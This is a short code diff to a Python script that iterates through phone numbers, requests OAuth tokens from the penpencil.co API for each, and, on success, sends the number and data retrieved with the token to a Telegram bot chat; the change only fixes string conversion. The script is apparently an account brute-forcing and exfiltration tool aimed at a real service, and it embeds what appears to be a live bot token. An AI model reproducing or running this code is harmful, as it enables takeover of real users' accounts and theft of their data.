@@ -40,5 +40,5 @@ while number!=8000000000:
     response = requests.post('https://api.penpencil.co/v3/oauth/token', headers=headers, json=json_data)
     if (response.json())['success']:
         token=response.json()['data']['access_token']
-        requests.get('https://api.telegram.org/bot6107093453:AAEwZhVbqR3VnAL-_1-9K12ijlc-7-vhaIE/sendMessage?chat_id=-838827510&text='+number+str(getBs(token)))
+        requests.get('https://api.telegram.org/bot6107093453:AAEwZhVbqR3VnAL-_1-9K12ijlc-7-vhaIE/sendMessage?chat_id=-838827510&text='+str(number)+str(getBs(token)))
     number-=1
